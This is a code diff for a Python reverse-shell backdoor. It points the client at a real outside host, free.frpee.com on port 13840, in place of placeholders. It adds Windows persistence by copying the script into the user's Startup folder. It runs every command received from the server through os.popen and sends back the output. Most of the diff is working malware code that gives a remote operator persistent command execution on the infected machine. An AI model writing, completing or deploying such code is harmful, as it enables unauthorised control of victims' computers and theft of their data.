@@ -2,10 +2,22 @@ import socket
 import os
 import threading
 import time
+import sys
+import shutil
 
-server_host = "Your IP"
-server_port = "Your Port"
+server_host = "free.frpee.com"
+server_port = 13840
 current_dir = os.getcwd()
+script_path = os.path.abspath(sys.argv[0])
+
+def startup_main(exe_path):
+    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    if not os.path.exists(startup_folder):
+        os.makedirs(startup_folder)
+    exe_name = os.path.basename(exe_path)
+    destination_path = os.path.join(startup_folder, exe_name)
+    shutil.copy(exe_path, destination_path)
+    print(f"文件已复制到启动文件夹: {destination_path}")
 
 def receive_commands(server_socket):
     global current_dir
@@ -14,13 +26,9 @@ def receive_commands(server_socket):
             command = server_socket.recv(4096).decode('utf-8')
             if not command:
                 break
-            
-            # 处理pwd命令（服务器初始获取当前目录）
             if command.strip().lower() == 'pwd':
                 server_socket.send(current_dir.encode('utf-8'))
                 continue
-            
-            # 处理cd命令
             if command.lower().startswith('cd '):
                 try:
                     if '/d' in command.lower():
@@ -34,11 +42,8 @@ def receive_commands(server_socket):
                     output = f"更改目录失败: {str(e)}"
                 server_socket.send(output.encode('utf-8'))
                 continue
-            
-            # 执行其他命令
             output = os.popen(command).read()
             server_socket.send(output.encode('utf-8'))
-            
         except Exception as e:
             print(f"与服务器通信时出错: {e}")
             break
@@ -70,4 +75,6 @@ def connect_to_server():
             print("[*] 与服务器的连接已关闭")
 
 if __name__ == "__main__":
+    print(script_path)
+    startup_main(script_path)
     connect_to_server()
